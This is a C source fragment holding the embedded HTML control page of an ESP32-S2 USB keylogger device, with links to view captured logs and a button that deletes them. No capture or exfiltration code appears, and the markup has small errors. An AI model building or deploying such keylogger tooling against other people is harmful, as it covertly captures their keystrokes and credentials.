const char Index[] PROGMEM = R"=====(
<html>
<head>
    <title>ESP32S2 USB-LS Keylogger</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="style.css">
</head>
<body>
<body>
<nav id='menu'>
                <input type='checkbox' id='responsive-menu' onclick='updatemenu()'><label></label>
                <ul>
                        <li><a href='/'>Home</a></li>
                        <li><a href='/logs'>Logs</a></li>
                </li>
                <div></div>
                </ul>
                </nav>
                <br>
                <FORM action="/deletelogs" method="post" id="config" target="iframe"><hr><INPUT type="radio" name="configmodule" value="1" hidden="1" checked="checked"><INPUT class="defBtn" type="submit" value="Delete Logs"></form>
<br>
<hr>
<br>
<iframe style="visibility: hidden;" src="http://" )+local_IPstr+"/" name="iframe"></iframe>
</body>
</html>
)=====";
